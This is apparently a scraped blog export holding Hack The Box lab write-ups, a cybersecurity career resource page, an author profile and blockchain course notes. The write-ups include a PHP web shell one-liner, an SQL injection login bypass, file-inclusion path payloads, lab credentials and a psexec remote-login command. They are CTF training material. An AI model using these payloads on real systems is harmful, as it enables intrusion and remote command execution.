Task 6 # What script can be used in order to search possible paths to escalate privileges on Windows hosts?\nwinpeas.exe\nTask 7 # What file contains the administrator\u0026rsquo;s password?\nConsoleHost_history.txt\nthe file above contains the credentials of the admin that we can use to escalate our privileges to root the machine.\nUser: administrator Password: MEGACORP_4dm1n!! Now we need a tool to log in as Administrator on our target PC and we cannot do it directly in our Windows Powershell as we do in the Linux system. There is a tool from our impacket named psexec.py which will help us.\nKill the PowerShell and mssqlclient on our machine. Let’s use our tool: python3 /opt/impacket/examples/psexec.py administrator@[Target_IP] next we shall change directory to the desktop directory of admin to get our root flag.\nand just like that, we have pawned our machine.\n","date":"23 September 2024","externalUrl":null,"permalink":"/posts/archetype/","section":"Posts","summary":"Archetype Stuff","title":"Archetype","type":"posts"},{"content":" Introduction # Task 1 # How many TCP ports are open?\n2\nTask 2 # What is the domain of the email address provided in the \u0026ldquo;Contact\u0026rdquo; section of the website?\nthetoppers.htb\nTask 3 # In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?\n/etc/hosts directory Task 4 # Which sub-domain is discovered during further enumeration?\ns3\nTask 5 # Which service is running on the discovered sub-domain?\nAmazon s3 Task 6 # Which command line utility can be used to interact with the service running on the discovered sub-domain?\nawscli\nTask 7 # Which command is used to set up the AWS CLI installation?\naws configure Task 8 # What is the command used by the above utility to list all of the S3 buckets?\naws s3 ls Task 9 # This server is configured to run files written in what web scripting language?\nPHP\nfor obtaining the root flag, we had to write a small php code that would prompt a cmdlet for us to get the flag, however, we had to upload the code to the s3 bucket inorder to be able to access it.\nThe code we shall use is as follows.\n\u0026lt;?php system(_$GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; we shall then access the shell.php file form the url in order to get our root flag\nand with that, we have pawned the machine.\n","date":"20 September 2024","externalUrl":null,"permalink":"/posts/three/","section":"Posts","summary":"Why did the S3 bucket break up with the EC2 instance?  Because it found someone with less latency! 😄","title":"Three","type":"posts"},{"content":"","date":"20 September 2024","externalUrl":null,"permalink":"/categories/tier1/","section":"Categories","summary":"","title":"Tier1","type":"categories"},{"content":" Getting started # Have you ever wondered where to begin when starting a career or shifting to a new path? I\u0026rsquo;ve been there too. I\u0026rsquo;ll outline the routes that helped me advance in cybersecurity, as well as other tech careers you can explore. I\u0026rsquo;ll also highlight paths for those interested in cloud computing with Microsoft, Google Cloud Platform, and AWS—plus blockchain technology.\nCyber Security # While there are numerous certifications available for various cybersecurity roles, it\u0026rsquo;s crucial to first acquire the fundamental skills necessary for entering the field. These basics include networking, understanding different operating systems (such as Windows and Unix-based systems), and computing essentials. I\u0026rsquo;ll provide resources for learning these foundational skills. Below, you\u0026rsquo;ll find a simple roadmap of certifications that can help you enter the job market. However, it\u0026rsquo;s important to note that certifications themselves are not as crucial as the skills gained while pursuing them.\nlearn Linux fundamental # Overthewire bandit war games Learn Windows Fundamentals # Underthewire war games for powershelll mastery Web Fundamentals # Overthewire Natas challenge Networks # CISCO’s Networking Basics course Intro to Capture The Flag # There are many ways to enter the cybersecurity field, and one effective approach is participating in various Capture The Flag (CTF) competitions. CTFs come in different formats, including jeopardy-style and attack-and-defend. In this section, we\u0026rsquo;ll focus primarily on jeopardy-style CTFs, which feature challenges from diverse categories such as web, forensics, miscellaneous, crypto, reverse engineering, malware analysis, and OSINT (Open Source Intelligence).\nImportantly, beyond solving challenges, participants are often required to create write-ups in blog format. This practice not only hones technical skills but also develops the crucial ability to document findings effectively. Such documentation skills are highly valued in the industry, as they enable professionals to produce comprehensive reports for organizations to assess and evaluate their security posture.\nBelow are more platforms that one can practice and participate in CTF\npicoCTF\nCyberTalents – A Global Platform For Cybersecurity Talents\nletsDefend\nCTFROOM\ncyberranges\nSofia Santos | OSINT and analysis exercise\nVulnhub\nPwn College\nHack this site\n\u0026#x26a1; The above list is not fully exhausted as there are more platforms out there.\nCloud computing # Many cloud providers offer certifications to familiarize users with their technologies, including Microsoft, AWS, and GCP (Google Cloud Platform). Additionally, there are platforms that provide CTF-like labs where individuals can practice their cloud computing skills. In this section, we\u0026rsquo;ll outline roadmaps to help you break into AWS, GCP, and Microsoft Azure.\nMicrosoft azure\nAs seen below are the certifications that one requires to become azure cloud practitioner.\nGoogle Cloud Platform\nAs seen below are the certifications that one requires to become google cloud certified practitioner.\nAWS\nAs seen below is a chart highlighting the certifications one is required to have in order to become an AWS cloud practitioner. However, the are CTF-like labs where one can put their skills to the test, these platforms are such as\nCloudgoat aws Flaws Beyond obtaining certifications, it\u0026rsquo;s crucial to continuously practice and hone your skills. This practice helps you stay up-to-date with the latest security issues arising from cloud misconfigurations—vulnerabilities that attackers exploit to access organizational resources. Here are some labs where you can actively learn new skills and develop strategies to counter potential attacks:\nPwnedLabs Block Chain # As the world embraces cryptocurrency, Blockchain technologies are growing rapidly. This swift expansion has led more individuals to explore the field, eager to understand the buzz surrounding Blockchain technology. The best platform I continue to learn from is Cyfrin Updraft, a free hands-on course where learners gain knowledge through practical projects. By the end of the course, participants emerge not only with knowledge and skills but also with a completed project—tangible proof of their work.\nHome | Cyfrin Updraft ","date":"19 September 2024","externalUrl":null,"permalink":"/resources/","section":"Resources","summary":"Blog helping on getting into tech","title":"Resources","type":"resources"},{"content":" Introduction # Task 1 # When visiting the web service using the IP address, what is the domain that we are being redirected to?\nFirst we had to scan the IP for open ports only to find port was open as shown below.\non visiting the web page, we are directed to the following domain.\nunika.htb\nIn order to be able to access the webpage on our machine, we are required to add it to the\netc/hosts directory and now we are able to see the page.\nTask 2 # Which scripting language is being used on the server to generate webpages?\nPHP\nTask 3 # What is the name of the URL parameter which is used to load different language versions of the webpage?\npage\nTask 4 # Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: \u0026ldquo;french.html\u0026rdquo;, \u0026ldquo;//10.10.14.6/somefile\u0026rdquo;, \u0026ldquo;../../../../../../../../windows/system32/drivers/etc/hosts\u0026rdquo;, \u0026ldquo;minikatz.exe\u0026rdquo;\n../../../../../../../../windows/system32/drivers/etc/hosts\nTask 5 # Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: \u0026ldquo;french.html\u0026rdquo;, \u0026ldquo;//10.10.14.6/somefile\u0026rdquo;, \u0026ldquo;../../../../../../../../windows/system32/drivers/etc/hosts\u0026rdquo;, \u0026ldquo;minikatz.exe\u0026rdquo;\n//10.10.14.6/somefile\nTask 6 # What does NTLM stand for?\nNew Technology LAN Manager\nTask 7 # Which flag do we use in the Responder utility to specify the network interface?\n-I\nTask 8 # There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.\nJohn The Ripper\nTask 9 # What is the password for the administrator user?\nFor this section, we had to serve a file and set responder ready to catch a credential when the web-server tries to access the file from our machine by exploiting remote file inclusion vulnerability as shown below\nthe file we were serving is called somefile that contains nothing at all\nAfter a while when the web server was trying to access the file from our machine, responder caught some credentials of which seems to be of an admin.\nNow next we shall try to crack the admin hash to get the password for the admin using john the ripper.\nAfter cracking it, we got the password, as seen below.\nbadminton\nTask 10 # We\u0026rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?\nHere we are required to do further enumeration to get the other port that is open\n5985\nFrom the port above, it is clear that we can log in to the machine using evil-winrm to get our root flag.\nour flag was under the user mike’s Desktop as shown below\n","date":"19 September 2024","externalUrl":null,"permalink":"/posts/responder/","section":"Posts","summary":"Why did the hacker bring a map to the server? Because they were trying to locate the LFI and remotely call the RFI! 😄","title":"Responder","type":"posts"},{"content":" Introduction # Task 1 # What Nmap scanning switch employs the use of default scripts during a scan?\n-sC\nTask 2 # What service version is found to be running on port 21?\nvsftpd 3.0.3\nTask 3 # What FTP code is returned to us for the \u0026ldquo;Anonymous FTP login allowed\u0026rdquo; message?\n230\nTask 4 # After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?\nanonymous\nTask 5 # After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?\nGet command but to download all files once, one can use the command mget as seen above.\nTask 6 # What is one of the higher-privilege sounding usernames in \u0026lsquo;allowed.userlist\u0026rsquo; that we download from the FTP server?\nadmin\nTask 7 # What version of Apache HTTP Server is running on the target host?\nApache httpd 2.4.41\nTask 8 # What switch can we use with Gobuster to specify we are looking for specific filetypes?\n-x\nTask 9 # Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?\nlogin.php\nAfter checking, the two files we downloaded, we were adble to get the admin and the password for the as seen as seen below.\nwe used the above credentials to log in to the platform and we got our flag.\n","date":"18 September 2024","externalUrl":null,"permalink":"/posts/crocodile/","section":"Posts","summary":"Croco, why did the FTP server break up with the client? Because it just couldn\u0026rsquo;t handle all the passive aggression! 😄","title":"Crocodile","type":"posts"},{"content":" Introduction # Task 1 # During our scan, which port do we find serving MySQL?\n3306\nTask 2 # What community-developed MySQL version is the target running?\nMariaDB\nTask 3 # When using the MySQL command line client, what switch do we need to use in order to specify a login username?\n-u from Mysql\nTask 4 # Which username allows us to log into this MariaDB instance without providing a password?\nroot\nTask 5 # In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?\nTask 6 # In SQL, what symbol do we need to end each query with?\n;\nTask 7 # There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that\u0026rsquo;s unique to this host?\nhtb\nTo get the root flag, we had to enumerate the htb box as shown below and we found our flag.\nWe have two tables, users and config.\nSelecting the data in users, we found nothing of interest, aside form the users\nBut for the config table, we found our flag\n","date":"17 September 2024","externalUrl":null,"permalink":"/posts/sequel/","section":"Posts","summary":"Why did the database administrator break up with the SQL query? Because it had too many joins! 😄","title":"Sequel","type":"posts"},{"content":" Introduction # Task 1 # What does the acronym SQL stand for?\nStructured Query Language\nTask 2 # What is one of the most common type of SQL vulnerabilities?\nSQL injection\nTask 3 # What is the 2021 OWASP Top 10 classification for this vulnerability?\nA03:2021-Injection\nTask 4 # What does Nmap report as the service and version that are running on port 80 of the target?\nApache httpd 2.4.38\nTask 5 # What is the standard port used for the HTTPS protocol?\n443\nTask 6 # What is a folder called in web-application terminology?\nDirectories\nTask 7 # What is the HTTP response code is given for \u0026lsquo;Not Found\u0026rsquo; errors?\n404\nTask 8 # Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we\u0026rsquo;re looking to discover directories, and not subdomains?\ndir\nTask 9 # What single character can be used to comment out the rest of a line in MySQL?\n# Task 10 # If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?\nCongratulations\nAfter I visited the site, I went ahead and used the payload admin’ # on the username field and then put some gibberish data on the password field and was able to log in. I got my payload from PayloadAllThings.\nAnd just like that, we were able to pawn the machine .\n","date":"16 September 2024","externalUrl":null,"permalink":"/posts/appointment/","section":"Posts","summary":"Waiting on the line.","title":"Appointment","type":"posts"},{"content":" Introduction # Task 1 # Which TCP port is open on the machine\n6379\nTask 2 # Which service is running on the port that is open on the machine?\nRedis\nTask 3 # What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database\nin-memory\nWhat is Redis Explained? | IBM\nTask 4 # Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.\nhttps://redis.io/docs/latest/operate/rs/references/cli-utilities/redis-cli/\nTask 5 # Which flag is used with the Redis command-line utility to specify the hostname?\n-h\nthe tool I used is a simplified version of man, a tool used to give more details about a cli tool,\nbelow is the explanation of the tool\nTask 6 # Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?\ninfo\nTask 7 # What is the version of the Redis server being used on the target machine?\n5.0.7\nTask 8 # Which command is used to select the desired database in Redis?\nhttps://redis.io/docs/latest/commands/\nTask 9 # How many keys are present inside the database with index 0?\n4\nTask 10 # Which command is used to obtain all the keys in a database?\nhttps://redis.io/docs/latest/commands/keys/\nTask 11 # Submit root flag\n","date":"14 September 2024","externalUrl":null,"permalink":"/posts/reedemer/","section":"Posts","summary":"Reedeming yourself","title":"Reedemer","type":"posts"},{"content":"","date":"14 September 2024","externalUrl":null,"permalink":"/categories/tier0/","section":"Categories","summary":"","title":"Tier0","type":"categories"},{"content":" Introduction # For this machine we shall be comprising SMB service in order to get our root flag and pawn the machine. Furthermore, there is a share that allows access without password.\nEnumeration # We shall first start by confirming that we can access the IP by pinging it.\nAs we can see the host is reachable from our attacking machine, we shall therefore go ahead and enumerate the machine using nmap to see services that are running as shown below.\nAs seen above we have SMB service open on port 445. Without going further, we can try to list the shares available on the host as seen below.\nThe syntax used to list the shares as seen above is smbclient -L ///. The -L flag is used to specify that we want to list all shares on the host. Moreover, as seen above the WorkShares share can be accessed without a password\nAccessing the WorkShares # We will be downloading the contents of the share using the get command but first, we shall starting enumerating the directories in the share.\nAs seen above, we have two directories, Amy.J and James.P, I accessed the Amy.J directory and found a worknotes.txt file and went ahead to download it. We shall then go to the James.P directory and see what content is in the directory.\nAs seen above the James.P directory has the flag, and opening the worknotes.txt file we are given some instructions to what seems like how to secure the ftp server, start an apache server on our machine and setup winrm to be able to connect to the machine.\nRoot # As seen below we have been able to get the root flag and compromised the SMB server.\nConclusion # In this lab we were able to exploit a share that has no password set to it, moreover, we were able to root the machine by accessing the root flag from the share.\n","date":"13 September 2024","externalUrl":null,"permalink":"/posts/dancing/","section":"Posts","summary":"Only the flexible to dance.","title":"Dancing","type":"posts"},{"content":" Introduction # For this machine we shall be exploiting the ftp service to get the root flag of the machine. However, we will first need to do the following.\nEnumeration of the machine Service discovery FTP anonymous log in Enumeration # Before enumerating, we shall start by checking if the IP is reachable from our attacking machine by pinging it as shown below.\nAfter enumeration, we were able to find out that ftp service is up and running as shown below.\nAs seen above the host is reachable from our attacking machine. We shall now enumerate the host using nmap using the following syntax as shown below\nNmap -sCV Furthermore, anonymous log in is allowed hence, we can easily now get our flag and pawn the machine.\nFTP Log in # After that we can now easily login and get our flag from the server easily as shown below.\nBelow as we can see, we have transferred the flag to our machine\nNow we can get the flag and pawn the machine.\nWith that we have successfully pawned the machine.\nWe have now successfully pawned the machine\nConclusion # In this lab we were able to learn that ftp is an insecure service for storing and transmitting of files over the internet, the secure service of it is SFTP.\n","date":"12 September 2024","externalUrl":null,"permalink":"/posts/fawn/","section":"Posts","summary":"FTP","title":"Fawn","type":"posts"},{"content":"","date":"12 September 2024","externalUrl":null,"permalink":"/tags/ftp/","section":"Tags","summary":"","title":"FTP","type":"tags"},{"content":" Introduction # For this machine, we are introduced to the hack the box sphere, where we are required to answer some questions and familiarize ourselves with the basic tools used for enumeration and exploitation of a machine.\nThe tasks that we shall be doing in this lab are as follows.\nLab setup Enumerate the IP given for open ports Exploit vulnerable service identified Lab Setup # Before interacting with the machine, we are required to connect to the platform using a vpn file as shown below.\nAs seen above we have answered the first three questions as shown below.\nAfter connecting to the platform via openvpn, we are then supposed to test the IP provided if is reachable form our attacking machine using the ping command as shown below.\nWith the above screenshot, our fourth question is answered as shown below.\nEnumeration # After enumerating the IP, we got the following output.\nAs seen above, port 23 is the only port that is open, the flag used for enumeration with nmap are explained as below.\nsCV - this is a combination of the following two flags, sC and -sV, where sC instructs nmap to scan the IP provided using default scripts sV instructs nmap to scan the IP for services running. The port open is 23 whose service is telnet, an insecure way of connecting remotely to workstations, as the communication is transmitted in plaintext.\nWith the screenshot above, we have answered our fifth and sixth questions as seen below.\nExploiting the telnet service # From the above enumeration, we have clearly identified that telnet service is running, therefore we can now successfully login to the service.\nAfter looking at the hint of the question for logging in to the telnet service, I realised it is a root user require to login to the platform with no password required for logging in as shown below.\nWe can now be able to get our root flag as seen below.\nConclusion # From the above lab, we have learnt that to connect to hack the box platform, one requires to connect via a vpn file and to enumerate an IP, we are required to use nmap for enumeration of the IP to identify services running on the IP. Furthermore, we have also learnt that telnet is an insecure service for remotely connecting to devices as it transmits data in plaintext over the network.\n","date":"11 September 2024","externalUrl":null,"permalink":"/posts/meow/","section":"Posts","summary":"Meow, meow","title":"Meow","type":"posts"},{"content":"","date":"30 July 2024","externalUrl":null,"permalink":"/about/","section":"Abouts","summary":"","title":"Abouts","type":"about"},{"content":" ~/Whoami # I am not the loudest in the room, nor the fastest on the keyboard. But in the silence between requests and responses, in the heartbeat of network traffic, I see what others miss.\nI don’t chase vulnerabilities; they reveal themselves to those who understand the language of systems. Firewalls, packets, and encrypted whispers, I listen where others overlook.\nI have learned that security isn’t just about defense; it’s about knowing where the cracks begin. From compromising the intentionally weak to fortifying the strong, my path is one of understanding, not destruction.\n~/Certifications # Issued by TryHackMe. # 2024 # 🎯 SOC Level 2 learning path 🎯 SOC Level 1 learning path 🎯 Cyber Defense learning path 🎯 DevSecOps learning path 🎯 Offensive Pentesting learning path 🎯 Security Engineer learning path 2023 # 🎯 CompTIA Pentest+ learning path 🎯 Red Teaming learning path 🎯 Web Fundamentals learning path 🎯 Complete Beginner learning path 🎯 Jr Penetration Tester learning path 🎯 Pre Security learning path 🎯 Introduction to Cyber Security Issued by Hack The Box # 2024 # 🎯 P.O.O lab (mini-prolab) Issued by Belkasoft # 2025 # 🎯Windows Forensics Issued by Zscaler # 2025 - 2028 # 🎯 Zero Trust cyber Assosciate Issued by Microsoft # 2023 # 🎯 Microsoft Certified: Azure Fundamentals ~/Skills # Technical Skills # 🎯 Penetration testing 🎯 Vulnerability Assessment 🎯 Digital Forensics 🎯 Log analysis 🎯 Incidence Response Soft Skills # 🔥Critical thinking 🔥Communication skills ~/Honours and awards # 2024 # 🥇 cyberPro CTF We took 1st place in the 2024 cyber week Hackathon CTF organized by Cyber Pro 🎖 National Research Fund Hackathon We took 4th place in the 2024 National Research Fund Hackathon innovation and CTF competition organized by National Research Fund. 2023 # 🎖 BSides Nairobi CTF We scooped position 7 in the BSides Nairobi CTF organized by Bsides Nairobi. 🎖 Shehacks Interversity We scooped position 7 in Shehacks intervasity CTF organized by Shehacks KE. 🥉 GreenFist CTF We scooped position 3 in Greenfist Ctf representing Kenya, the competition was organized by Youung CISO Network. 2022 # 🏅 picoCTF 2023 We scooped positioin 42 in Africa in the 2023 picoCTF competiton organized by picoCTF. ~/Areas of interest # Red team Web Application Security Digital Forensics Open Source Intelligence Cloud Networking ","date":"30 July 2024","externalUrl":null,"permalink":"/about/brief/","section":"Abouts","summary":"Hello Friend.","title":"Intro","type":"about"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/categories/block-chain/","section":"Categories","summary":"","title":"Block Chain","type":"categories"},{"content":" What is a Blockchain? # Bitcoin and Blockchain # You might be familiar with\nBitcoin , which is one of the first protocols to utilize the revolutionary blockchain technology. The Bitcoin Whitepaper, authored by the pseudonymous\nSatoshi Nakamoto , described how Bitcoin could facilitate peer-to-peer transactions within a decentralized network using cryptography. This gave rise to censorship-resistant finance and presented\nBitcoin as a superior digital store of value, often referred to as\ndigital gold\n. There is a fixed amount of Bitcoin, similar to the scarcity of gold. You can learn more about this in the\nBitcoin Whitepaper\n.\nEthereum and Smart Contracts # A few years after Bitcoin\u0026rsquo;s creation, Vitalik Buterin and others founded\nEthereum , which builds upon the blockchain infrastructure, but with additional capabilities. With Ethereum, you can create decentralized transactions, organizations, and agreements without a centralized intermediary. This was achieved through the addition of\nsmart contracts .\nThough the concept of smart contracts was originally conceived in 1994 by\nNick Szabo\n, Ethereum made it a reality.\nSmart contracts are a set of instructions executed in a decentralized way without the need for a centralized or third party intermediary.\nSmart Contract functionality is the primary difference between blockchains like\nEthereum and\nBitcoin . Technically\nBitcoin does have smart contracts but they\u0026rsquo;re intentionally\nturing incomplete .\nThe Oracle Problem # However, smart contracts face a significant limitation – they cannot interact with or access data from the real world. This is known as the\nOracle Problem .\nBlockchains are deterministic systems, so everything happens within their ecosystem. To make smart contracts more useful and capable of handling real-world data, they need external data and computation.\nOracles serve this purpose. They are devices or services that provide data to blockchains or run external computation. To maintain decentralization, it\u0026rsquo;s necessary to use a decentralized Oracle network rather than relying on a single source. This combination of on-chain logic with off-chain data leads to\nhybrid smart contracts .\nNote:\nChainlink # Chainlink\nis a popular decentralized Oracle network that enables smart contracts to access external data and computation. Chainlink is also blockchain agnostic - so it\u0026rsquo;s going to work with any chain out there.\nLayer 2 Scaling Solutions # As blockchains grow, they face scaling issues. Layer 2, or L2, solutions have been developed to address this. L2 solutions involve other blockchains hooking into the main blockchain, essentially allowing it to scale. There are two primary types of L2 solutions:\nOptimistic Rollups: eg. Optimism, Arbitrum Zero-Knowledge Rollups: eg. ZK Sync, Polygon ZK EVM Don\u0026rsquo;t worry too much about this now. Once we understand how blockchains work \u0026lsquo;under the hood\u0026rsquo;, we\u0026rsquo;ll go further into Layer 2\u0026rsquo;s then.\nTerminology # You\u0026rsquo;re going to hear some terms used in this course (and the community as a whole) a little interchangeably. Maybe you haven\u0026rsquo;t heard these terms before. I hope this offers a bit of clarification.\nCommon Terms Blockchain: In web3, a blockchain is a digital ledger that records transactions across many computers in a secure and decentralized manner. Each block contains a number of transactions, and every new block is linked to the previous one, forming a chain. This makes the data tamper-resistant. Example: Bitcoin\u0026rsquo;s blockchain records all BTC transactions. Oracle: Oracles in web3 are intermediaries that provide smart contracts with external data. They act as bridges between blockchains and the outside world, allowing smart contracts to execute based on real-world events and data. Example: A weather oracle provides data for a smart contract that triggers crop insurance payments based on rainfall data. Layer 2: Layer 2 solutions in web3 are technologies built on top of a blockchain (Layer 1) to improve its scalability and efficiency. These solutions handle transactions off the main chain, reducing congestion and fees, and then settle the final state on the main chain. Example: The Lightning Network for Bitcoin. Dapp (Decentralized Application): A Dapp is an application that runs on a decentralized network, typically a blockchain. It is powered by smart contracts and operates without a central authority. Dapps can serve various purposes, from finance to gaming. Example: Uniswap, a decentralized finance application. Smart Contract: In web3, a smart contract is a self-executing contract with the terms of the agreement directly written into code. They run on blockchains and automatically execute when predetermined conditions are met, without the need for intermediaries. Example: A smart contract for an escrow service. Hybrid Smart Contract: Hybrid smart contracts combine on-chain code (running on a blockchain) with off-chain data and computations provided by oracles. This allows the contracts to interact with data and systems outside their native blockchain. Example: A smart contract for insurance that uses real-world data (like weather or flight delays) provided by oracles. Ethereum/EVM (Ethereum Virtual Machine): Ethereum is a blockchain platform known for its smart contract functionality. The Ethereum Virtual Machine (EVM) is its computation engine that executes smart contracts. Ethereum allows developers to build decentralized applications and is the basis for many web3 projects. Example: ERC-20 tokens, a standard for creating fungible tokens on Ethereum. Web3 # Web3 is a term used to describe the new paradigm of the internet powered by blockchain and smart contracts. Unlike the previous versions of the web, web3 is permissionless and relies on decentralized networks rather than centralized servers. This ushers in an era of censorship-resistant and transparent agreements and transactions, often called an ownership economy.\nWeb1:\nThe permissionless open sources web with static content\nWeb2:\nThe permissioned web, with dynamic content where companies run your agreements on their servers.\nWeb3:\nThe permissionless web with dynamic content.\nDecentralized censorship reesistant networks run your agreemeent and code. User owned ecosystems where one owns a portion of the protocol they interact with - instead of solely being the product Wrap Up # We\u0026rsquo;ve taken a high-level view of the blockchain landscape, including its history and the problems that smart contracts solve.\nAt this point you might be asking yourself\nwhat do these smart contracts really mean?\nor\nwhat is meant by trust minimized agreements/unbreakable promises?\nIn my mind a technology is really only as good as the problem it solves. So next, we\u0026rsquo;re going to look at what the\npurpose\nof\nsmart contracts is - what\u0026rsquo;s the value proposition exactly?\nPurpose of smart contracts # The Essence of Blockchain and Smart Contracts # Almost every interaction or transaction in our lives involves some form of agreement or contract. For instance, purchasing a chair involves a contract to buy lumber, assemble it, and sell the finished product. Your electricity supply is also based on an agreement between you and the electric company. When you get an oil change for your car, you\u0026rsquo;re promised a service in exchange for money.\nAlmost everything we do in modern life relates to an agreement or contract in some way.\nTo make it more relatable, think of contracts and agreements as promises. Traditional contracts, however, require trust between parties, and this doesn’t always work in favor of honesty and fairness.\nThe Problem with Traditional Agreements # Lets consider some real world examples of where trust leverages agreements can go wrong and why blockchain technology and smart contracts mitigates these risks.\nConsumer Trust # In the 80s and 90s, McDonald’s Monopoly game promised customers a chance to win money through game cards obtained with purchases. However, it turned out that the game was rigged by insiders who manipulated the system for their gain. Essentially, McDonald’s failed to keep its promise.\nThis example demonstrates that relying on trust within agreements can lead to fraudulent activities and broken promises.\nWith smart contracts, we can eliminate the need for trust. A smart contract is an agreement or a set of instructions that are deployed on a decentralized blockchain. Once deployed, it cannot be altered, it automatically executes, and everyone can see its terms.\nImagine if McDonald’s Monopoly game was operated on a blockchain through a smart contract. The fraudulent activities would have been impossible due to the immutable, decentralized, and transparent nature of smart contracts.\nBanking and Trust # Traditional banks have sometimes failed to keep the promise of safeguarding people\u0026rsquo;s money, as seen during the Great Depression. Blockchain and smart contracts can ensure transparency and execute automated solvency checks, preventing the bank from becoming insolvent.\nThe core of blockchain and smart contracts lies in creating a trustless system where agreements are transparent, unchangeable, and executed without human intervention. This technology holds the potential to revolutionize industries and everyday agreements by ensuring honesty and fairness.\nFinancial Markets Access # Centralized bodies, like traditional exchanges, have the power to restrict access to financial markets. This was evident when Robinhood restricted trading on certain assets in 2021. With decentralized exchanges like Uniswap, there is no central authority that can alter or limit market access. This introduces fairness and openness to the financial markets.\nTo Summarize # Traditional Agreements: Require trust in a centralized entity. Smart Contracts: Transparent, decentralized, and tamper-proof. In a scenario where you have to choose, smart contracts are an obvious choice as they cannot be manipulated or altered in anyone\u0026rsquo;s favor.\nSmart contracts are\nthe\nsolution to minimizing the reliance on trust based systems that have historically failed us time and time again.\nUnder the Hood # Smart contracts are relatively new, but have already started transforming various markets. They do this by representing \u0026lsquo;promises\u0026rsquo; as code on the blockchain. This code is executed by a decentralized collective, such that no single entity can alter the agreemeent in any way! The agreement and it\u0026rsquo;s terms are public knowledge and will automatically execute without human intervention.\nMore industries are adopting smart contracts and blockchain due to the numerous advantages they offer. This results in trust-minimized agreements or what can be simply termed as unbreakable promises.\nBeyond Trust Minimization # It is important to note that blockchain, smart contracts, and cryptocurrencies are not just about trust-minimized agreements. They offer security benefits, uptime advantages, execution speed, and\nmuch more\n.\nCaution: Not All Are Equal # However, beware of platforms that claim to be decentralized but are not in practice. An example from 2022 is the\nSBF\u0026#39;s FTX platform . It presented itself as a Web3 platform, but was essentially a traditional Web2 company using cryptocurrency without the benefits of smart contracts.\nAs an emerging developer or user in this space, it\u0026rsquo;s important to discern between legitimate projects and those that aren\u0026rsquo;t contributing to the ethos of Web3. I want you to be successful, but I want you to be successful because you\u0026rsquo;re creating value. Platforms like\nFTX were pretending to bring value to the space and leeching value from it.\nWrap Up # What we\u0026rsquo;ve learnt is that traditional contracts or agreements between parties are almost always trust based. Trust based agreements come with inherent flaws and the potential of broken agreements, the conseequences of which we\u0026rsquo;ve seen throughout history - The Great Depression, Monopoly Lottery, Robin Hood etc.\nBlockchain technology and smart contracts solve these problems by introducing fairness, transparency and immutability to promises. These attributes of smart contracts assure that trust isn\u0026rsquo;t required and we can be certain that an agreement will be executed as described 100% of the time.\nLastly, it\u0026rsquo;s important to note that there are several actors, such as\nFTX which\npretend\nto embody the ideologies of Web3, but are really centralized entities looking to extract value from the system, be aware of these.\nCurrent smart contract landscape # Features of Smart Contracts # Smart contracts come with various features that distinguish them from traditional agreements.\nDecentralization # The first feature is decentralization; smart contracts do not rely on any centralized intermediary. Instead, they run on a blockchain which is maintained by thousands of individuals known as node operators. It\u0026rsquo;s the collective effort of these node operators running the smart contracts that make the network decentralized. This aspect will be discussed more in-depth later.\nTransparency and Flexibility # Transparency is inherent to blockchain networks. Since all node operators can see everything happening on-chain, there is no room for unfair or hidden deals. This transparency ensures that everyone has access to the same information and plays by the same rules.\nIt is important to note that this transparency does not necessarily compromise privacy. Blockchain is pseudo-anonymous, meaning that your transactions are not directly tied to your real-world identity.\nSpeed and Efficiency # Smart contracts and blockchain transactions are incredibly fast and efficient compared to traditional banking systems. For example, bank transfers, especially international ones, can take up to several weeks, whereas blockchain transactions happen almost instantly. This speed is not only convenient but also allows for more efficient interactions between parties.\nSecurity and Immutability # Once a smart contract is deployed, it cannot be altered or tampered with. This immutability ensures that the terms of the contract are set in stone. This is a stark contrast to centralized systems where a server or database can be hacked, and data can be altered. The decentralized nature of blockchain makes hacking nearly impossible since an attacker would have to take control of more than half the nodes, which is significantly more challenging than compromising a single centralized server.\nAdditionally, the data on a blockchain is resilient. In a traditional system, if your computer and backups fail, you lose all your data. In contrast, in a blockchain, your data is replicated across thousands of nodes. Even if several nodes were to go down, your data would remain secure as long as there is at least one copy of the blockchain.\nElimination of Counterparty Risk # Smart contracts eliminate the need for trust in transactions. Once a smart contract is deployed, its terms cannot be changed. This means that parties cannot alter the agreement based on greed or any other factors. This ensures that the agreement is enforced as originally intended.\nIn traditional systems, there is always a risk that the other party might not fulfill their end of the bargain. With smart contracts, this risk is eliminated, and agreements are enforced programmatically.\nApplications of Smart Contracts # Smart contracts have given rise to new industries and revolutionized existing ones.\nDecentralized Finance (DeFi) # DeFi, or Decentralized Finance, allows users to engage with financial markets without relying on centralized intermediaries. With smart contracts, users have transparent access to financial markets and can engage with sophisticated financial products efficiently and securely. We will provide practical examples of how to build and interact with DeFi protocols in upcoming lessons.\nDecentralized Autonomous Organizations (DAOs) # DAOs are governed entirely by smart contracts and operate in a decentralized manner. This structure offers benefits such as transparent governance, efficient engagement, and clear rules. DAOs are an evolution in politics and governance, and we will cover how to build and work with DAOs in future lessons.\nNon-Fungible Tokens (NFTs) # NFTs, or Non-Fungible Tokens, can be thought of as digital art or unique assets. NFTs have created new avenues for artists and creators to monetize their work. We will also cover how to create and interact with NFTs in this course.\nOther Applications # And then, maybe\nyou\u0026rsquo;ll\nbe the one to discover the next iteration of smart contract applications!\nHow Blockchains work # In this lesson, we\u0026rsquo;re going to break down blockchains, the process and the technology itself using a widely-praised and accessible demo available\nhere\n.\nUnderstanding Hash Functions # At its simplest, a hash is a unique, fixed-length string that serves to identify any piece 